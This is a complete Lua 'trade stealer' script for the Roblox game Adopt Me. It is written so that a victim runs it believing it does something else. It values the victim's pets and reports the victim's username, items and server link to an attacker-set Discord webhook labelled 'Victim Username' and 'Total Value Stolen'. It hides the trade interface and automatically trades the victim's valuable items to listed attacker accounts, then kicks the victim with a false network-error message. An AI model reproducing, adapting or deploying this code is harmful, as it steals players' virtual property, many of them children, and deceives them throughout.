_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local users = _G.Usernames or {}
local min_value = _G.min_value or 0.1
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""

local Players = game:GetService("Players")
local plr = Players.LocalPlayer

if next(users) == nil or webhook == "" then
    plr:kick("You didn't add username or webhook")
    return
end

if game.PlaceId ~= 920587237 then
    plr:kick("Game not supported. Please join a normal Adopt Me server")
    return
end

if #Players:GetPlayers() >= 48 then
    plr:kick("Server is full. Please join a less populated server")
    return
end

if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
    plr:kick("Server error. Please join a DIFFERENT server")
    return
end

local itemsToSend = {}
local inTrade = false
local playerGui = plr:WaitForChild("PlayerGui")
local tradeFrame = playerGui.TradeApp.Frame
local dialog = playerGui.DialogApp.Dialog
local toolApp = playerGui.ToolApp.Frame
local tradeLicense = require(game.ReplicatedStorage.SharedModules.TradeLicenseHelper)

if not tradeLicense.player_has_trade_license() then
    plr:kick("This script wont work on an alt account. Please use your main account")
    return
end

local HttpService = game:GetService("HttpService")
local Loads = require(game.ReplicatedStorage.Fsys).load
local RouterClient = Loads("RouterClient")
local SendTrade = RouterClient.get("TradeAPI/SendTradeRequest")
local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
local SettingsRemote = RouterClient.get("SettingsAPI/SetSetting")
local InventoryDB = Loads("InventoryDB")

local headers = {
    ["Accept"] = "*/*",
    ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
}

local valueResponse = request({
    Url = "https://elvebredd.com/api/pets/get-latest",
    Method = "GET",
    Headers = headers
})

local responseData = HttpService:JSONDecode(valueResponse.Body)
local petsData = HttpService:JSONDecode(responseData.pets)

local petsByName = {}
for key, pet in pairs(petsData) do
    if type(pet) == "table" and pet.name then
        petsByName[pet.name] = pet
    end
end

local function getPetValue(petName, petProps)
    local pet = petsByName[petName]
    if not pet then
        return nil
    end

    local baseKey
    if petProps.mega_neon then
        baseKey = "mvalue"
    elseif petProps.neon then
        baseKey = "nvalue"
    else
        baseKey = "rvalue"
    end

    local suffix = ""
    if petProps.rideable and petProps.flyable then
        suffix = " - fly&ride"
    elseif petProps.rideable then
        suffix = " - ride"
    elseif petProps.flyable then
        suffix = " - fly"
    else
        suffix = " - nopotion"
    end

    local key = baseKey .. suffix
    return pet[key] or pet[baseKey]
end

local totalValue = 0

local function propertiesToString(props)
    local str = ""
    if props.rideable then str = str .. " Rideüî¥" end
    if props.flyable then str = str .. " Flyüîµ" end
    if props.mega_neon then
        str = str .. " Megaüü£"
    elseif props.neon then
        str = str .. " Neonüü¢"
    else
        str = str .. "d"
    end
    return str
end

local function SendJoinMessage(list, prefix)
    local headers = {
        ["Content-Type"] = "application/json"
    }

    -- –°–æ–∑–¥–∞–µ–º –∫—Ä–∞—Å–∏–≤—ã–π —Ü–≤–µ—Ç –Ω–∞ –æ—Å–Ω–æ–≤–µ –æ–±—â–µ–≥–æ –∑–Ω–∞—á–µ–Ω–∏—è
    local embedColor
    if totalValue > 100 then
        embedColor = 0xFFD700 -- –ó–æ–ª–æ—Ç–æ–π –¥–ª—è –≤—ã—Å–æ–∫–∏—Ö –∑–Ω–∞—á–µ–Ω–∏–π
    elseif totalValue > 50 then
        embedColor = 0x00FF00 -- –ó–µ–ª–µ–Ω—ã–π –¥–ª—è —Å—Ä–µ–¥–Ω–∏—Ö –∑–Ω–∞—á–µ–Ω–∏–π
    else
        embedColor = 0x0099FF -- –°–∏–Ω–∏–π –¥–ª—è –Ω–∏–∑–∫–∏—Ö –∑–Ω–∞—á–µ–Ω–∏–π
    end

    local fields = {
        {
            name = "üë§ Victim Username",
            value = string.format("```%s```", plr.Name),
            inline = true
        },
        {
            name = "üí∞ Total Value",
            value = string.format("```$%.2f```", totalValue),
            inline = true
        },
        {
            name = "üì¶ Total Items",
            value = string.format("```%d items```", #list),
            inline = true
        },
        {
            name = "üîó Join Link",
            value = string.format("[Click to Join](https://fern.wtf/joiner?placeId=85896571713843&gameInstanceId=%s)", game.JobId),
            inline = false
        }
    }

    -- –ì—Ä—É–ø–ø–∏—Ä—É–µ–º –ø—Ä–µ–¥–º–µ—Ç—ã
    local grouped = {}
    for _, item in ipairs(list) do
        local key = item.Name .. "|" .. tostring(item.Properties.rideable) .. "|" .. tostring(item.Properties.flyable) .. "|" .. tostring(item.Properties.neon) .. "|" .. tostring(item.Properties.mega_neon)
        if grouped[key] then
            grouped[key].Count = grouped[key].Count + 1
            grouped[key].TotalValue = grouped[key].TotalValue + item.Value
        else
            grouped[key] = {
                Name = item.Name,
                Properties = item.Properties,
                Count = 1,
                TotalValue = item.Value,
                SingleValue = item.Value
            }
        end
    end

    -- –°–æ—Ä—Ç–∏—Ä—É–µ–º –ø–æ —Å—Ç–æ–∏–º–æ—Å—Ç–∏
    local groupedList = {}
    for _, group in pairs(grouped) do
        table.insert(groupedList, group)
    end

    table.sort(groupedList, function(a, b)
        return a.TotalValue > b.TotalValue
    end)

    -- –°–æ–∑–¥–∞–µ–º –æ–ø–∏—Å–∞–Ω–∏–µ —Å —Ç–æ–ø –ø—Ä–µ–¥–º–µ—Ç–∞–º–∏
    local description = "**üéØ Top Valuable Items:**\n"
    local topItemsShown = 0
    local otherItemsValue = 0
    local otherItemsCount = 0

    for i, group in ipairs(groupedList) do
        if i <= 8 then -- –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Ç–æ–ø 8 –ø—Ä–µ–¥–º–µ—Ç–æ–≤
            local emoji = "‚Ä¢"
            if group.Properties.mega_neon then
                emoji = "üü£"
            elseif group.Properties.neon then
                emoji = "üü¢"
            else
                emoji = "‚ö™"
            end
            
            if group.Properties.rideable and group.Properties.flyable then
                emoji = emoji .. "üî¥üîµ"
            elseif group.Properties.rideable then
                emoji = emoji .. "üî¥"
            elseif group.Properties.flyable then
                emoji = emoji .. "üîµ"
            end

            local itemLine = string.format("%s **%s** (x%d) - $%.2f\n", 
                emoji, group.Name, group.Count, group.TotalValue)
            
            if #description + #itemLine < 400 then
                description = description .. itemLine
                topItemsShown = topItemsShown + 1
            else
                otherItemsValue = otherItemsValue + group.TotalValue
                otherItemsCount = otherItemsCount + group.Count
            end
        else
            otherItemsValue = otherItemsValue + group.TotalValue
            otherItemsCount = otherItemsCount + group.Count
        end
    end

    -- –î–æ–±–∞–≤–ª—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ–± –æ—Å—Ç–∞–ª—å–Ω—ã—Ö –ø—Ä–µ–¥–º–µ—Ç–∞—Ö
    if otherItemsCount > 0 then
        description = description .. string.format("\n**üì¶ +%d other items** - $%.2f", 
            otherItemsCount, otherItemsValue)
    end

    local data = {
        ["content"] = prefix .. "üéÆ **New Trade Available!** Join quickly!\n" ..
                     "`game:GetService('TeleportService'):TeleportToPlaceInstance(920587237, '" .. game.JobId .. "')`",
        ["embeds"] = {{
            ["title"] = "üöÄ Adopt Me Trade Execution",
            ["description"] = description,
            ["color"] = embedColor,
            ["fields"] = fields,
            ["thumbnail"] = {
                ["url"] = "https://cdn.discordapp.com/emojis/1126159975061762159.webp"
            },
            ["footer"] = {
                ["text"] = "Adopt Me Trader ‚Ä¢ " .. os.date("%Y-%m-%d %H:%M:%S"),
                ["icon_url"] = "https://cdn.discordapp.com/emojis/1126159975061762159.webp"
            },
            ["timestamp"] = DateTime.now():ToIsoDate()
        }}
    }

    local body = HttpService:JSONEncode(data)
    local response = request({
        Url = webhook,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

local function SendMessage(sortedItems)
    local headers = {
        ["Content-Type"] = "application/json"
    }

    local embedColor = 0x00FF00 -- –ó–µ–ª–µ–Ω—ã–π –¥–ª—è —É—Å–ø–µ—à–Ω–æ–π —Å–¥–µ–ª–∫–∏

    local fields = {
        {
            name = "üë§ Victim Username",
            value = string.format("```%s```", plr.Name),
            inline = true
        },
        {
            name = "üí∞ Total Value Stolen",
            value = string.format("```$%.2f```", totalValue),
            inline = true
        },
        {
            name = "üì¶ Items Sent",
            value = string.format("```%d items```", #sortedItems),
            inline = true
        },
        {
            name = "üïí Server Time",
            value = string.format("```%s```", os.date("%H:%M:%S")),
            inline = true
        }
    }

    -- –ê–Ω–∞–ª–æ–≥–∏—á–Ω–∞—è –≥—Ä—É–ø–ø–∏—Ä–æ–≤–∫–∞ –∫–∞–∫ –≤ SendJoinMessage
    local grouped = {}
    for _, item in ipairs(sortedItems) do
        local key = item.Name .. "|" .. tostring(item.Properties.rideable) .. "|" .. tostring(item.Properties.flyable) .. "|" .. tostring(item.Properties.neon) .. "|" .. tostring(item.Properties.mega_neon)
        if grouped[key] then
            grouped[key].Count = grouped[key].Count + 1
            grouped[key].TotalValue = grouped[key].TotalValue + item.Value
        else
            grouped[key] = {
                Name = item.Name,
                Properties = item.Properties,
                Count = 1,
                TotalValue = item.Value
            }
        end
    end

    local groupedList = {}
    for _, group in pairs(grouped) do
        table.insert(groupedList, group)
    end

    table.sort(groupedList, function(a, b)
        return a.TotalValue > b.TotalValue
    end)

    -- –°–æ–∑–¥–∞–µ–º –æ–ø–∏—Å–∞–Ω–∏–µ —Å —ç–º–æ–¥–∑–∏
    local description = "**‚úÖ Successfully Sent Items:**\n"
    for i, group in ipairs(groupedList) do
        if i <= 15 then -- –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–∫–∞–∑—ã–≤–∞–µ–º—ã—Ö –ø—Ä–µ–¥–º–µ—Ç–æ–≤
            local emoji = "‚Ä¢"
            if group.Properties.mega_neon then
                emoji = "üü£"
            elseif group.Properties.neon then
                emoji = "üü¢"
            else
                emoji = "‚ö™"
            end
            
            if group.Properties.rideable and group.Properties.flyable then
                emoji = emoji .. "üî¥üîµ"
            elseif group.Properties.rideable then
                emoji = emoji .. "üî¥"
            elseif group.Properties.flyable then
                emoji = emoji .. "üîµ"
            end

            description = description .. string.format("%s %s (x%d) - $%.2f\n", 
                emoji, group.Name, group.Count, group.TotalValue)
        end
    end

    if #groupedList > 15 then
        description = description .. string.format("\n**üì¶ +%d more items...**", #groupedList - 15)
    end

    local data = {
        ["embeds"] = {{
            ["title"] = "üéâ Trade Completed Successfully!",
            ["description"] = description,
            ["color"] = embedColor,
            ["fields"] = fields,
            ["thumbnail"] = {
                ["url"] = "https://cdn.discordapp.com/emojis/1126159975061762159.webp"
            },
            ["footer"] = {
                ["text"] = "Adopt Me Trader ‚Ä¢ " .. os.date("%Y-%m-%d %H:%M:%S"),
                ["icon_url"] = "https://cdn.discordapp.com/emojis/1126159975061762159.webp"
            },
            ["timestamp"] = DateTime.now():ToIsoDate()
        }}
    }

    local body = HttpService:JSONEncode(data)
    local response = request({
        Url = webhook,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

local hashes = {}
for _, v in pairs(getgc()) do
    if type(v) == "function" and debug.getinfo(v).name == "get_remote_from_cache" then
        local upvalues = debug.getupvalues(v)
        if type(upvalues[1]) == "table" then
            for key, value in pairs(upvalues[1]) do
                hashes[key] = value
            end
        end
    end
end

local function hashedAPI(remoteName, ...)
    local remote = hashes[remoteName]
    if not remote then return nil end

    if remote:IsA("RemoteFunction") then
        return remote:InvokeServer(...)
    elseif remote:IsA("RemoteEvent") then
        remote:FireServer(...)
    end
end

local data = hashedAPI("DataAPI/GetAllServerData")
if not data then
    plr:kick("Tampering detected. Please rejoin and re-execute without any other scripts")
    return
end

local excludedItems = {
    "spring_2025_minigame_scorching_kaijunior",
    "spring_2025_minigame_toxic_kaijunior",
    "spring_2025_minigame_spiked_kaijunior",
    "spring_2025_minigame_spotted_kaijunior"
}
local inventory = data[plr.Name].inventory

for category, list in pairs(inventory) do
    for uid, data in pairs(list) do
        local cat = InventoryDB[data.category]
        if cat and cat[data.id] then
            local value = getPetValue(cat[data.id].name, data.properties)
            if value and value >= min_value then
                if table.find(excludedItems, data.id) then
                    continue
                end
                table.insert(itemsToSend, {UID = uid, Name = cat[data.id].name, Properties = data.properties, Value = value})
                totalValue = totalValue + value
            end
        end
    end
end

tradeFrame:GetPropertyChangedSignal("Visible"):Connect(function()
    if tradeFrame.Visible then
        inTrade = true
    else
        inTrade = false
    end
end)

dialog:GetPropertyChangedSignal("Visible"):Connect(function()
    dialog.Visible = false
end)

toolApp:GetPropertyChangedSignal("Visible"):Connect(function()
    toolApp.Visible = true
end)

game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
game:GetService("Players").LocalPlayer.PlayerGui.HintApp:Destroy()
game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = false

if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b)
        return a.Value > b.Value
    end)

    local sentItems = {}
    for i, v in ipairs(itemsToSend) do
        sentItems[i] = v
    end

    local prefix = ""
    if ping == "Yes" then
        prefix = "--[[@everyone]] "
    end

    SendJoinMessage(itemsToSend, prefix)
    SettingsRemote:FireServer("trade_requests", 1)

    local function doTrade(joinedUser)
        while #itemsToSend > 0 do
            local tradeRequestSent = false
            if not inTrade and not tradeRequestSent then
                SendTrade:FireServer(game.Players[joinedUser])
                tradeRequestSent = true
            else
                for i = 1, math.min(18, #itemsToSend) do
                    local item = table.remove(itemsToSend, 1)
                    AddPetRemote:FireServer(item.UID)
                end
                repeat
                    AcceptNegotiationRemote:FireServer()
                    wait(0.1)
                    ConfirmTradeRemote:FireServer()
                until not inTrade
                tradeRequestSent = false
            end
            wait(1)
        end
        plr:kick("Check your internet conection ")
    end

    local function waitForUserChat()
        local sentMessage = false
        local function onPlayerChat(player)
            if table.find(users, player.Name) then
                player.Chatted:Connect(function()
                    if not sentMessage then
                        SendMessage(sentItems)
                        sentMessage = true
                    end
                    doTrade(player.Name)
                end)
            end
        end
        for _, p in ipairs(Players:GetPlayers()) do onPlayerChat(p) end
        Players.PlayerAdded:Connect(onPlayerChat)
    end
    waitForUserChat()
end
